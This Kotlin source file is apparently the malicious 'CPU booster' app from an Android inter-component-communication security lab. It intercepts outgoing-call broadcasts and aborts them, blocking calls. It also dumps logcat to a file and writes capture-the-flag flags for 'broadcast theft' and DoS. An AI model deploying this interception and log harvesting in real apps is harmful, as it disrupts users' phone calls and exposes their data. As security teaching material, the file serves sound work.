package uk.ac.swansea.dascalu.dvmicc.cpu_booster.icc

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Environment
import android.widget.Toast

import uk.ac.swansea.dascalu.dvmicc.cpu_booster.R

import java.io.BufferedReader
import java.io.File
import java.io.FileInputStream
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.util.Locale

class AppActivityReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        //check intent action is the one the receiver listens for
        if(intent!!.action == "android.intent.action.NEW_OUTGOING_CALL") {
            abortBroadcast()
            resultData = null

            if(context != null) {
                val securityLevel = loadSecuritySettingsFromFile(context)

                if(securityLevel == "low") {
                    writeDataToFile(context, context.resources.getStringArray(
                            R.array.broadcastTheftDOSFlags)[0])
                } else if(securityLevel == "high") {
                    writeDataToFile(context, context.resources.getStringArray(
                            R.array.broadcastTheftDOSFlags)[1])
                }
            }
        }
    }

    private fun writeDataToFile(context: Context, flag: String?) {
        val fileOut = context.openFileOutput("data.txt", Context.MODE_APPEND)
        val writer = OutputStreamWriter(fileOut)

        Runtime.getRuntime().exec("logcat -f ${context.filesDir}/data.txt")
        Thread.sleep(500)

        if(flag != null) {
            writer.write("\nFlag: $flag\n")
        }

        writer.close()
    }

    private fun loadSecuritySettingsFromFile(context: Context) : String {
        val storageState = Environment.getExternalStorageState()

        if((storageState == Environment.MEDIA_MOUNTED) || storageState == Environment.MEDIA_MOUNTED_READ_ONLY) {
            val homeAppContext = context.createPackageContext("uk.ac.swansea.dascalu.dvmicc.home",
                    Context.CONTEXT_IGNORE_SECURITY)
            val settingsFile = File(homeAppContext.getExternalFilesDir(null), "dvmicc.txt")

            if (settingsFile.exists()) {
                val reader = BufferedReader(InputStreamReader(FileInputStream(settingsFile)))

                val vulnerableAppSecurityLevel = reader.readLine().toLowerCase(Locale.ROOT)

                reader.close()
                return vulnerableAppSecurityLevel
            } else {
                Toast.makeText(context, "Security level settings file is not present!",
                        Toast.LENGTH_LONG).show()

                return "low"
            }
        } else {
            Toast.makeText(context, "External storage is not present!",
                    Toast.LENGTH_LONG).show()

            return "low"
        }
    }
}